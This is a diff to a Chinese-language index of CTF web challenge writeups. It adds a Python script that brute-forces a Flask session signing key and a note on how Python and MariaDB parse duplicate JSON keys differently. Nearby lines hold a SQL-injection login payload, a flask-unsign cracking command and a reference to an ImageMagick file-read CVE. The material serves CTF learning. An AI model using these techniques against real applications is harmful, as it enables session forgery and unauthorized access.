@@ -1678,7 +1678,7 @@ cd ../
 ```
 205. [certified1](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified1)
 - rust ImageMagick web应用漏洞：[CVE-2022-44268](https://www.metabaseq.com/imagemagick-zero-days/).当处理png时，可能会导致服务器上的任意文件读取。[poc](https://github.com/voidz0r/CVE-2022-44268)
-  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
+  - 注意这个漏洞无法读取/proc下的文件，因为/proc下的文件不是真正意义上的文件：https://superuser.com/questions/619955/how-does-proc-work 。所以需要配合题目中自带的其他漏洞：[certified2](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)
 206. [Lambda](https://hackmd.io/@Solderet/SomeWriteupForWaniCTF2023-XogSiA#Lambda---web)
 - AWS相关考点cheatsheet：https://github.com/pop3ret/AWSome-Pentesting/blob/main/AWSome-Pentesting-Cheatsheet.md
 - 此题给出了AWS相关凭证，要求获取其lambda函数(A lambda function is a piece of code that is executed whenever is triggered by an event from an event source)内容。以下代码获取lambda函数名称：
@@ -2273,3 +2273,72 @@ results = db.flags.find(
     - 用户名与密码均为：`' || 'a'=='a`
 239. [Very Secure](https://xhacka.github.io/posts/Very-Secure/)
 - flask session secret key爆破：flask-unsign+字典。`flask-unsign --wordlist ./keys --cookie '' --unsign --no-literal-eval`。字典格式：每个key之间用`\n`分隔
+- 如果不想用字典，也可以直接在程序里爆破key
+```py
+import itertools
+import zlib
+from flask.sessions import SecureCookieSessionInterface
+from itsdangerous import base64_decode
+
+# from https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py
+class MockApp(object):
+	def __init__(self, secret_key):
+		self.secret_key = secret_key
+
+def encode(secret_key, session_cookie_structure):
+	""" Encode a Flask session cookie """
+	try:
+		app = MockApp(secret_key)
+		
+		session_cookie_structure = session_cookie_structure
+		si = SecureCookieSessionInterface()
+		s = si.get_signing_serializer(app)
+		
+		return s.dumps(session_cookie_structure)
+	except Exception as e:
+		return "[Encoding error] {}".format(e)
+
+def decode(session_cookie_value, secret_key=None):
+	""" Decode a Flask cookie  """
+	if (secret_key == None):
+		compressed = False
+		payload = session_cookie_value
+		
+		if payload.startswith('.'):
+			compressed = True
+			payload = payload[1:]
+		
+		data = payload.split(".")[0]
+		
+		data = base64_decode(data)
+		if compressed:
+			data = zlib.decompress(data)
+		
+		return data
+	else:
+		app = MockApp(secret_key)
+		
+		si = SecureCookieSessionInterface()
+		s = si.get_signing_serializer(app)
+		
+		return s.loads(session_cookie_value)
+cookie = 
+for c in itertools.product(range(0, 256), repeat=2):
+	k = bytes(c)
+	try:
+		print(decode(cookie, k))
+	except Exception as e:
+		pass
+	else:
+		print(k)
+		break
+```
+240. [west-side-story](https://ebonyx.notion.site/web-west-side-story-27bed9514e14478a8ab4c3fd772dc011)
+- python与mariadb处理json重复键名时的不同操作：python看最后一个key，mariadb看第一个。如：
+```
+json={"admin":true, "admin":false}
+print(json['admin'])
+python:false
+mariadb:true
+```
+json由处理差异导致的漏洞可参考 https://bishopfox.com/blog/json-interoperability-vulnerabilities ，从这里面提到的内容入手
